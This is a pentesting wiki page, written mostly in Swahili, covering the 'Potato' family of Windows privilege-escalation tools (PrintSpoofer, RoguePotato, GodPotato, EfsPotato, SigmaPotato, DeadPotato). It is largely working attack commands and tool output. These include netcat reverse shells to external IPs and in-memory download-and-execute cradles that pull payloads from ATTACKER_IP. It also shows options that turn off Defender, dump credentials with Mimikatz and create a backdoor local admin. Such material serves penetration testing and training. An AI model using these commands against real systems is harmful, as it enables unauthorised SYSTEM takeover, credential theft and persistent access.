# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** kwenye Windows Server 2019 na Windows 10 build 1809 na matoleo ya baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumiwa **kutumia privileges zilezile na kupata** access ya kiwango cha `NT AUTHORITY\SYSTEM`. [Blog post hii](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) inaeleza kwa kina kuhusu tool ya `PrintSpoofer`, ambayo inaweza kutumiwa kutumia vibaya impersonation privileges kwenye hosts za Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Alternative ya kisasa inayodumishwa mara kwa mara katika 2024–2025 ni SigmaPotato (fork ya GodPotato), ambayo inaongeza matumizi ya in-memory/.NET reflection na support iliyopanuliwa ya OS. Tazama matumizi ya haraka hapa chini na repo iliyo kwenye References.

Kurasa zinazohusiana kwa maelezo ya msingi na techniques za manual:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na matatizo ya kawaida

Techniques zote zifuatazo zinategemea kutumia vibaya service yenye privileges na uwezo wa kufanya impersonation, kutoka kwenye context iliyo na mojawapo ya privileges hizi:

- SeImpersonatePrivilege (ya kawaida zaidi) au SeAssignPrimaryTokenPrivilege
- High integrity haihitajiki ikiwa token tayari ina SeImpersonatePrivilege (jambo la kawaida kwa service accounts nyingi kama vile IIS AppPool, MSSQL, n.k.)

Angalia privileges kwa haraka:
```cmd
whoami /priv | findstr /i impersonate
```
Maelezo ya uendeshaji:

- Ikiwa shell yako inaendeshwa chini ya restricted token isiyo na SeImpersonatePrivilege (jambo la kawaida kwa Local Service/Network Service katika baadhi ya mazingira), rudisha account’s default privileges ukitumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer inahitaji Print Spooler service iwe inaendeshwa na iweze kufikiwa kupitia local RPC endpoint (spoolss). Katika hardened environments ambapo Spooler imezimwa baada ya PrintNightmare, tumia RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato inahitaji OXID resolver inayoweza kufikiwa kupitia TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (angalia mfano hapa chini). Builds za zamani zilihitaji flag ya -f.
- EfsPotato/SharpEfsPotato hutumia vibaya MS-EFSR; ikiwa pipe moja imezuiwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 wakati wa RpcBindingSetAuthInfo kwa kawaida huashiria RPC authentication service isiyojulikana/isiyoungwa mkono; jaribu pipe/transport tofauti au hakikisha target service inaendeshwa.
- Forks za “Kitchen-sink” kama DeadPotato hujumuisha payload modules za ziada (Mimikatz/SharpHound/Defender off) zinazogusa disk; tarajia EDR detection ya juu zaidi ikilinganishwa na original slim.

## Demo ya Haraka

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Maelezo:
- Unaweza kutumia `-i` kuanzisha mchakato wa interactive kwenye console ya sasa, au `-c` kuendesha one-liner.
- Inahitaji Spooler service. Ikiwa imezimwa, hii itashindwa.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ikiwa outbound 135 imezuiwa, pivot OXID resolver kupitia socat kwenye redirector yako:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ni primitive mpya ya COM abuse iliyotolewa mwishoni mwa 2022, inayolenga service ya **PrintNotify** badala ya Spooler/BITS. Binary hii inaanzisha PrintNotify COM server, inaingiza `IUnknown` bandia, kisha inachochea privileged callback kupitia `CreatePointerMoniker`. PrintNotify service (inayoendesha kama **SYSTEM**) inapounganisha tena, process inakopi token iliyorejeshwa na kuanzisha payload iliyotolewa ikiwa na full privileges.<sup>[[13]](#references)</sup>

Maelezo muhimu ya uendeshaji:

* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu Print Workflow/PrintNotify service iwe imesakinishwa (ipo hata legacy Spooler ikiwa imezimwa baada ya PrintNightmare).
* Inahitaji calling context iwe na **SeImpersonatePrivilege** (jambo la kawaida kwa IIS APPPOOL, MSSQL, na scheduled-task service accounts).
* Inakubali direct command au interactive mode ili uweze kubaki ndani ya console ya awali. Mfano:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Kwa kuwa inategemea COM pekee, hakuna named-pipe listeners au external redirectors zinazohitajika, hivyo inakuwa drop-in replacement kwenye hosts ambazo Defender inazuia RoguePotato’s RPC binding.

Waendeshaji kama Ink Dragon huendesha PrintNotifyPotato mara tu baada ya kupata ViewState RCE kwenye SharePoint ili kufanya pivot kutoka kwa worker wa `w3wp.exe` kwenda SYSTEM kabla ya kusakinisha ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Dokezo: Ikiwa pipe moja itashindwa au EDR itaizuia, jaribu pipe nyingine zinazotumika:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Maelezo:
- Hufanya kazi katika Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege ipo.
- Pakua binary inayolingana na runtime iliyosakinishwa (kwa mfano, `GodPotato-NET4.exe` kwenye Server 2022 ya kisasa).
- Ikiwa primitive yako ya awali ya execution ni webshell/UI yenye timeouts fupi, stage payload kama script na uiombe GodPotato iendeshe badala ya command ndefu ya inline.<sup>[[12]](#references)</sup>

Muundo wa haraka wa staging kutoka kwenye IIS webroot inayoweza kuandikwa:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato hutoa variants mbili zinazolenga service DCOM objects ambazo kwa default hutumia RPC_C_IMP_LEVEL_IMPERSONATE. Build au tumia binaries zilizotolewa na uendeshe command yako:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork ya GodPotato iliyosasishwa)

SigmaPotato inaongeza vipengele vya kisasa kama vile in-memory execution kupitia .NET reflection na PowerShell reverse shell helper.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Faida za ziada katika builds za 2024–2025 (v1.2.x):
- `--revshell` flag ya reverse shell iliyojengwa ndani na kuondolewa kwa kikomo cha herufi 1024 cha PowerShell, hivyo unaweza kutuma payloads ndefu za AMSI-bypassing mara moja.
- Syntax inayofaa kwa Reflection (`[SigmaPotato]::Main()`), pamoja na ujanja wa msingi wa AV evasion kupitia `VirtualAllocExNuma()` ili kuvuruga heuristics rahisi.
- `SigmaPotatoCore.exe` tofauti iliyocompile dhidi ya .NET 2.0 kwa mazingira ya PowerShell Core.

### DeadPotato (GodPotato rework ya 2024 yenye modules)

DeadPotato huhifadhi GodPotato OXID/DCOM impersonation chain, lakini hujumuisha post-exploitation helpers ili operators waweze kuchukua SYSTEM mara moja na kufanya persistence/collection bila tooling ya ziada.<sup>[[15]](#references)</sup>

Modules za kawaida (zote zinahitaji SeImpersonatePrivilege):

- `-cmd "<cmd>"` — anzisha command yoyote kama SYSTEM.
- `-rev <ip:port>` — reverse shell ya haraka.
- `-newadmin user:pass` — tengeneza local admin kwa persistence.
- `-mimi sam|lsa|all` — weka na endesha Mimikatz ili kudump credentials (hugusa disk, ni noisy).
- `-sharphound` — endesha SharpHound collection kama SYSTEM.
- `-defender off` — zima Defender real-time protection (ni noisy sana).

Mifano ya one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Kwa kuwa inasafirisha binaries za ziada, tarajia flags nyingi zaidi za AV/EDR; tumia GodPotato/SigmaPotato yenye ukubwa mdogo zaidi pale stealth ni muhimu.

## References

- [1] [PrintSpoofer – Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [No more JuicyPotato? Old story, welcome RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
